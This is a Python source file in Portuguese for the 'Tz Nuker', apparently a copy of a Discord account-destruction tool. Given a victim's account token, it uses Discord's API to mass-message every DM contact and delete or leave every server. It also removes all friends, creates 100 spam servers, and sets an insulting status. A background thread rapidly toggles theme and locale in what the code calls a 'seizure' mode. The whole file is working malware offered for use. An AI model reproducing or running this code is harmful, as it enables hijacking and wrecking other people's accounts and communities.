# Esse self foi orgulhosamente codificado por Rdimo (https://instagram.com/tzfofo).
# Copyright (c) 2021 🜲 Oi, eu sou o Tz#0001 | https://instagram.com/tzfofo
# Tz Nuker sob a Licença Pública Geral GNU v2 (1991).

import threading
import requests
import Tz
import random

from itertools import cycle
from colorama import Fore

from util.plugins.common import SlowPrint, setTitle, getheaders, proxy

def Tz_Nuke(token, Server_Name, message_Content):
    setTitle("Implantando Nuke Perigoso")
    print(f"{Fore.RESET}[{Fore.RED}*{Fore.RESET}] {Fore.BLUE}Arma nuclear de risco implantada. . .")
    if threading.active_count() <= 100:
        t = threading.Thread(target=CustomSeizure, args=(token, ))
        t.start()

    headers = {'Authorization': token}
    channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token)).json()
    for channel in channelIds:
        try:
            requests.post(f'https://discord.com/api/v9/channels/'+channel['id']+'/messages',
            proxies={"http": f'{proxy()}'},
            headers=headers,
            data={"content": f"{message_Content}"})
            setTitle(f"Messaging "+channel['id'])
            print(f"{Fore.RED}ID da mensagem: {Fore.WHITE}"+channel['id']+Fore.RESET)
        except Exception as e:
            print(f"O seguinte erro foi encontrado e está sendo ignorado: {e}")
    print(f"{Fore.RED}Enviou uma mensagem para todos os amigos disponíveis.{Fore.RESET}\n")
    
    guildsIds = requests.get("https://discord.com/api/v8/users/@me/guilds", headers=getheaders(token)).json()
    for guild in guildsIds:
        try:
            requests.delete(
                f'https://discord.com/api/v8/users/@me/guilds/'+guild['id'], proxies={"http": f'{proxy()}'}, headers={'Authorization': token})
            print(f"{Fore.YELLOW}Servidor esquerda: {Fore.WHITE}"+guild['name']+Fore.RESET)
        except Exception as e:
            print(f"O seguinte erro foi encontrado e está sendo ignorado: {e}")

    for guild in guildsIds:
        try:
            requests.delete(f'https://discord.com/api/v8/guilds/'+guild['id'], proxies={"http": f'{proxy()}'}, headers={'Authorization': token})
            print(f'{Fore.RED}Servidor deletada: {Fore.WHITE}'+guild['name']+Fore.RESET)
        except Exception as e:
            print(f"O seguinte erro foi encontrado e está sendo ignorado: {e}")
    print(f"{Fore.YELLOW}Apagou/Deixou todos os Servidores disponíveis.{Fore.RESET}\n")

    friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships", proxies={"http": f'{proxy()}'}, headers=getheaders(token)).json()
    for friend in friendIds:
        try:
            requests.delete(
                f'https://discord.com/api/v9/users/@me/relationships/'+friend['id'], proxies={"http": f'{proxy()}'}, headers=getheaders(token))
            setTitle(f"Removendo amigo: "+friend['user']['username']+"#"+friend['user']['discriminator'])
            print(f"{Fore.GREEN}Amigo removido: {Fore.WHITE}"+friend['user']['username']+"#"+friend['user']['discriminator']+Fore.RESET)
        except Exception as e:
            print(f"O seguinte erro foi encontrado e está sendo ignorado: {e}")
    print(f"{Fore.GREEN}Todos os amigos disponíveis foram removidos.{Fore.RESET}\n")
    
    for i in range(100):
        try:
            payload = {'name': f'{Server_Name}', 'region': 'europe', 'icon': None, 'channels': None}
            requests.post('https://discord.com/api/v7/guilds', proxies={"http": f'{proxy()}'}, headers=getheaders(token), json=payload)
            setTitle(f"Criando {Server_Name} #{i}")
            print(f"{Fore.BLUE}Criado {Server_Name} #{i}.{Fore.RESET}")
        except Exception as e:
            print(f"O seguinte erro foi encontrado e está sendo ignorado: {e}")
    print(f"{Fore.BLUE}Criou todos os servidores.{Fore.RESET}\n")
    t.do_run = False
    requests.delete("https://discord.com/api/v8/hypesquad/online", proxies={"http": f'{proxy()}'}, headers=getheaders(token))
    setting = {
          'theme': "light",
          'locale': "ja",
          'message_display_compact': False,
          'inline_embed_media': False,
          'inline_attachment_media': False,
          'gif_auto_play': False,
          'render_embeds': False,
          'render_reactions': False,
          'animate_emoji': False,
          'convert_emoticons': False,
          'enable_tts_command': False,
          'explicit_content_filter': '0',
          "custom_status": {"text": "Eu tenho merda por https://instagram.com/tzfofo"},
          'status': "idle"
    }
    requests.patch("https://discord.com/api/v7/users/@me/settings", proxies={"http": f'{proxy()}'}, headers=getheaders(token), json=setting)
    j = requests.get("https://discordapp.com/api/v9/users/@me", proxies={"http": f'{proxy()}'}, headers=getheaders(token)).json()
    a = j['username'] + "#" + j['discriminator']
    setTitle(f"detonado com sucesso!")
    SlowPrint(f"{Fore.GREEN}Transformado com sucesso {a} em um terreno baldio perigoso ")
    print("Digite qualquer coisa para continuar. . . ", end="")
    input()
    Hazard.main()

def CustomSeizure(token):
    print(f'{Fore.MAGENTA}Iniciando o modo de apreensão {Fore.RESET}{Fore.WHITE}(Ligar/desligar o modo claro/escuro){Fore.RESET}\n')
    t = threading.currentThread()
    while getattr(t, "do_run", True):
        modes = cycle(["light", "dark"])
        #cycle between light/dark mode and languages
        setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
        requests.patch("https://discord.com/api/v7/users/@me/settings", proxies={"http": f'{proxy()}'}, headers=getheaders(token), json=setting)